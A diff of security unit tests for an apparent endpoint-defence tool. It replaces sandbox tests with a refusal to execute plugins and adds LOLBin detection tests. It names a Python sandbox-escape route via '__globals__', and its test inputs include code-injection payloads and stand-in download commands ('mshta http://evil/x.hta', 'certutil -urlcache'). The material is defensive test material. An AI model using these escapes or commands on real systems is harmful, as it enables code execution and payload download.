@@ -3,7 +3,8 @@ tests/test_security.py — JARVIS V55.0 OMNI-REDUNDANCY security tests.
 
 Covers the three V55.0 subsystems and their correlator wiring:
   - core.self_integrity : interpreter .text hash, module hashes, canary, exec-page walk.
-  - core.plugin_loader  : SHA-256 manifest gate, restricted sandbox, severity routing.
+  - core.plugin_loader  : manifest integrity inventory, refusal to execute plugin
+                          source (V69 M61.7), severity routing.
   - core.kernel_telemetry: ETW process-create / image-load heuristics.
 
 These are pure unit/integration tests — no ETW session, Ollama, or audio required.
@@ -67,48 +68,72 @@ def test_exec_pages_returns_set():
 
 
 # ───────────────────────────── plugin_loader ───────────────────────────────
-def test_sandbox_blocks_open():
-    fn = pl._compile_one("evil_open", "def analyze(e):\n    return open('x')")
-    assert callable(fn)
-    with pytest.raises(Exception):
-        fn({"severity": 9})
+# V69 M61.7 — these three tests previously asserted that a "restricted sandbox"
+# blocked `open` and `__import__`. They passed, and they were false confidence: the
+# naive spellings they tried did fail, while `json.dumps.__globals__['__builtins__']`
+# reached the real builtins and imported `os`, read files and spawned subprocesses
+# from inside the same sandbox. Rather than assert a boundary that does not exist,
+# they now assert the boundary that does: nothing is executed at all. The full
+# escape corpus and the structural guarantees live in
+# tests/test_plugin_exec_v69_m617.py.
+def test_plugin_source_is_never_executed():
+    """The old `open('x')` payload is now inert because it is never compiled."""
+    assert pl._compile_one("evil_open", "def analyze(e):\n    return open('x')") is None
 
 
-def test_sandbox_blocks_dynamic_import():
-    fn = pl._compile_one("evil_import", "def analyze(e):\n    return __import__('os')")
-    assert callable(fn)
-    with pytest.raises(Exception):
-        fn({})
+def test_dynamic_import_payload_is_never_executed():
+    assert pl._compile_one("evil_import", "def analyze(e):\n    return __import__('os')") is None
 
 
-def test_compile_rejects_missing_analyze():
+def test_compile_refuses_every_plugin_including_wellformed_ones():
+    """Refusal is unconditional — not a validation failure that a fix could pass."""
     assert pl._compile_one("no_entry", "x = 1") is None
+    assert pl._compile_one("well_formed", "def analyze(e):\n    return {'ok': 1}") is None
+    assert pl.DYNAMIC_EXEC_SUPPORTED is False
 
 
 @pytest.fixture
 def restore_manifest():
-    """Snapshot and restore plugins/manifest.json + LOADED_PLUGINS around a test."""
-    orig = _MANIFEST.read_text(encoding="utf-8") if _MANIFEST.exists() else "[]"
+    """Snapshot and restore plugins/manifest.json + LOADED_PLUGINS around a test.
+
+    V69 M61.7 — restores BYTES, not text. ``write_text`` translates newlines on
+    Windows, so restoring an LF-committed file produced CRLF and left
+    ``plugins/manifest.json`` permanently modified in the working tree after any
+    suite run. That is how the release qualification acquired a standing
+    ``working_tree_not_clean`` warning: a test was mutating a tracked file.
+    """
+    orig = _MANIFEST.read_bytes() if _MANIFEST.exists() else b"[]\n"
     saved = dict(pl.LOADED_PLUGINS)
     yield
-    _MANIFEST.write_text(orig, encoding="utf-8")
+    _MANIFEST.write_bytes(orig)
     pl.LOADED_PLUGINS.clear()
     pl.LOADED_PLUGINS.update(saved)
 
 
 def _write_manifest(sha: str):
+    # newline="" so this fixture never rewrites the file's line endings either.
     _MANIFEST.write_text(json.dumps([{
         "name": "threat_escalator", "file": "threat_escalator.example.py",
         "sha256": sha, "version": "0.1", "enabled": True,
-    }], indent=2), encoding="utf-8")
+    }], indent=2), encoding="utf-8", newline="")
 
 
-def test_loads_sha_verified_plugin(restore_manifest):
+def test_a_sha_verified_plugin_is_still_not_executed(restore_manifest):
+    """A MATCHING hash is not an execution ticket.
+
+    This test previously asserted the opposite (that a hash match loaded the plugin).
+    The manifest sits in the same directory as the plugin, so whoever can write the
+    plugin can write its expected hash: the digest proves the file was not corrupted
+    in transit, never that it is trustworthy.
+    """
     digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
     _write_manifest(digest)
     pl.LOADED_PLUGINS.clear()
     pl.load_all()
-    assert "threat_escalator" in pl.LOADED_PLUGINS
+    assert "threat_escalator" not in pl.LOADED_PLUGINS
+    # ...but it IS reported, with its integrity state, rather than silently ignored.
+    assert pl.REFUSED_PLUGINS["threat_escalator"]["integrity"] == "match"
+    assert pl.REFUSED_PLUGINS["threat_escalator"]["reason"]
 
 
 def test_refuses_sha_mismatch(restore_manifest):
@@ -116,6 +141,7 @@ def test_refuses_sha_mismatch(restore_manifest):
     pl.LOADED_PLUGINS.clear()
     pl.load_all()
     assert "threat_escalator" not in pl.LOADED_PLUGINS
+    assert pl.REFUSED_PLUGINS["threat_escalator"]["integrity"] == "mismatch"
 
 
 class _FakeCorrelator:
@@ -126,55 +152,74 @@ class _FakeCorrelator:
         self.ingested.append(ev)
 
 
-def test_route_event_escalates(restore_manifest):
-    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
-    _write_manifest(digest)
+# The severity gate, the loop guard and the correlator re-ingest path are real
+# routing logic and still deserve coverage. V69 M61.7 exercises them with an
+# in-process callable injected straight into LOADED_PLUGINS instead of a plugin
+# compiled from source: the router is what is under test, and driving it no longer
+# requires exec'ing a file from an operator-writable directory.
+def _escalator(event):
+    """Behavioural stand-in for plugins/threat_escalator.example.py."""
+    sev = float(event.get("severity", 0) or 0)
+    attck = [str(t).upper() for t in (event.get("attck") or [])]
+    injection = any(t.startswith("T1055") for t in attck)
+    exfil = any(t in ("T1048", "T1041") for t in attck)
+    if sev >= 9.0 and injection and exfil:
+        enriched = dict(event)
+        enriched["severity"] = 10.0
+        enriched["plugin_note"] = "threat_escalator: concurrent injection+exfil"
+        return enriched
+    return None
+
+
+@pytest.fixture
+def routed_plugin():
+    """Install the stand-in as a loaded plugin for the duration of one test."""
+    saved = dict(pl.LOADED_PLUGINS)
     pl.LOADED_PLUGINS.clear()
-    pl.load_all()
+    pl.LOADED_PLUGINS["threat_escalator"] = {
+        "fn": _escalator, "sha256": "0" * 64, "version": "0.1",
+        "load_time": 0.0, "calls": 0, "errors": 0,
+    }
+    yield
+    pl.LOADED_PLUGINS.clear()
+    pl.LOADED_PLUGINS.update(saved)
+
+
+def _drive(event):
     fc = _FakeCorrelator()
     pl._correlator = fc
 
-    async def drive():
-        await pl.route_event({"severity": 9.0, "attck": ["T1055", "T1041"], "type": "x"})
+    async def run():
+        await pl.route_event(event)
         await asyncio.sleep(0.1)
 
-    asyncio.run(drive())
+    asyncio.run(run())
+    return fc
+
+
+def test_route_event_escalates(routed_plugin):
+    fc = _drive({"severity": 9.0, "attck": ["T1055", "T1041"], "type": "x"})
     assert fc.ingested, "eligible event should be re-ingested"
     assert fc.ingested[0]["severity"] == 10.0
     assert fc.ingested[0]["_plugin_enriched"] is True
 
 
-def test_route_event_skips_low_severity(restore_manifest):
-    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
-    _write_manifest(digest)
-    pl.LOADED_PLUGINS.clear()
-    pl.load_all()
-    fc = _FakeCorrelator()
-    pl._correlator = fc
-
-    async def drive():
-        await pl.route_event({"severity": 3.0, "attck": ["T1055", "T1041"]})
-        await asyncio.sleep(0.1)
-
-    asyncio.run(drive())
-    assert not fc.ingested
+def test_route_event_skips_low_severity(routed_plugin):
+    assert not _drive({"severity": 3.0, "attck": ["T1055", "T1041"]}).ingested
 
 
-def test_route_event_loop_guard(restore_manifest):
-    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
-    _write_manifest(digest)
-    pl.LOADED_PLUGINS.clear()
-    pl.load_all()
-    fc = _FakeCorrelator()
-    pl._correlator = fc
-
-    async def drive():
-        await pl.route_event({"severity": 10.0, "attck": ["T1055", "T1041"],
-                              "_plugin_enriched": True})
-        await asyncio.sleep(0.1)
-
-    asyncio.run(drive())
+def test_route_event_loop_guard(routed_plugin):
+    fc = _drive({"severity": 10.0, "attck": ["T1055", "T1041"], "_plugin_enriched": True})
     assert not fc.ingested, "already-enriched events must not re-route"
+
+
+def test_route_event_is_inert_after_a_real_manifest_load(restore_manifest):
+    """The end-to-end consequence: a manifest-listed plugin routes nothing."""
+    _write_manifest(hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest())
+    pl.LOADED_PLUGINS.clear()
+    pl.load_all()
+    fc = _drive({"severity": 9.0, "attck": ["T1055", "T1041"], "type": "x"})
+    assert not fc.ingested
 
 
 # ──────────────────────────── kernel_telemetry ─────────────────────────────
@@ -191,6 +236,99 @@ def test_analyze_flags_lolbin_and_suspicious_dll(monkeypatch):
     kinds = [e[0] for e in emitted]
     assert "kernel_process_create" in kinds
     assert "kernel_image_load" in kinds
+
+
+# ── V69 M61 RC1: the analyzer parses WINDOWS paths on ANY host ──────────────
+# ``os.path.basename`` binds to the host flavour, so on POSIX it returned the
+# whole of ``C:\Windows\System32\mshta.exe`` and no LOLBin ever matched: a silent
+# detection loss on every non-Windows host, including CI.
+def _emitted(monkeypatch):
+    out = []
+    monkeypatch.setattr(kt, "_emit",
+                        lambda kind, sev, attck, extra: out.append((kind, extra)))
+    return out
+
+
+@pytest.mark.parametrize("image,expected", [
+    (r"C:\Windows\System32\mshta.exe",   "mshta.exe"),
+    (r"C:/Windows/System32/mshta.exe",   "mshta.exe"),   # mixed/forward separators
+    (r"\\host\share\certutil.exe",       "certutil.exe"),  # UNC
+    ("mshta.exe",                        "mshta.exe"),   # already bare
+    ("  C:\\Windows\\rundll32.exe  ",    "rundll32.exe"),
+    ("",                                 ""),
+])
+def test_image_basename_is_host_independent(image, expected):
+    assert kt._image_basename(image) == expected
+
+
+def test_lolbin_detection_survives_a_posix_host(monkeypatch):
+    """The regression itself: a Windows LOLBin path must alert on a Linux host."""
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 1, "ImageName": r"C:\Windows\System32\mshta.exe",
+                 "CommandLine": "mshta http://evil/x.hta",
+                 "ProcessId": "123", "ParentProcessId": "4"})
+    assert [k for k, _ in emitted] == ["kernel_process_create"]
+    reasons = emitted[0][1]["reasons"]
+    assert any("LOLBin process: mshta.exe" == r for r in reasons)
+
+
+def test_multiple_independent_signals_are_all_preserved(monkeypatch):
+    """A LOLBin running FROM a user-writable path is two findings, not one.
+
+    Classification must not stop at the first match — that would discard the
+    signal that makes the event more suspicious than either half.
+    """
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 1,
+                 "ImageName": r"C:\Users\bob\AppData\Local\Temp\certutil.exe",
+                 "CommandLine": "certutil -urlcache -f http://evil/x",
+                 "ProcessId": "7", "ParentProcessId": "4"})
+    assert len(emitted) == 1, "one event must produce exactly one finding"
+    reasons = emitted[0][1]["reasons"]
+    assert any(r.startswith("LOLBin process:") for r in reasons)
+    assert any(r.startswith("process from user-writable path:") for r in reasons)
+    assert len(reasons) == len(set(reasons)), "duplicate reasons emitted"
+    # Deterministic ordering: LOLBin is always reported before the path signal.
+    assert reasons.index(next(r for r in reasons if r.startswith("LOLBin"))) == 0
+
+
+def test_no_reflective_load_finding_is_invented_off_windows(monkeypatch):
+    """``os.path.exists`` cannot observe a Windows filesystem from Linux.
+
+    It answered "absent" for every Windows path, so each image load acquired a
+    fabricated "reflective load indicator" with no observation behind it. The
+    genuine suspicious-path signal must still fire.
+    """
+    monkeypatch.setattr(kt, "_IS_WINDOWS", False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5,
+                 "ImageName": r"C:\Users\bob\AppData\Local\Temp\evil.dll",
+                 "ProcessId": "55"})
+    assert [k for k, _ in emitted] == ["kernel_image_load"]
+    reasons = emitted[0][1]["reasons"]
+    assert any("suspicious path" in r for r in reasons)
+    assert not any("reflective load" in r for r in reasons), \
+        "a finding was invented from an observation this host cannot make"
+
+
+def test_a_clean_windows_dll_path_produces_no_finding_off_windows(monkeypatch):
+    """The negative control for the above: no suspicious dir, so no event at all."""
+    monkeypatch.setattr(kt, "_IS_WINDOWS", False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5, "ImageName": r"C:\Windows\System32\ntdll.dll",
+                 "ProcessId": "55"})
+    assert emitted == []
+
+
+def test_reflective_load_indicator_still_works_on_windows(monkeypatch):
+    """Existing kernel_image_load behaviour is preserved where it is evidence."""
+    monkeypatch.setattr(kt, "_IS_WINDOWS", True)
+    monkeypatch.setattr(kt.os.path, "exists", lambda _p: False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5, "ImageName": r"C:\Windows\System32\phantom.dll",
+                 "ProcessId": "55"})
+    assert [k for k, _ in emitted] == ["kernel_image_load"]
+    assert any("reflective load" in r for r in emitted[0][1]["reasons"])
 
 
 def test_analyze_ignores_benign_process(monkeypatch):
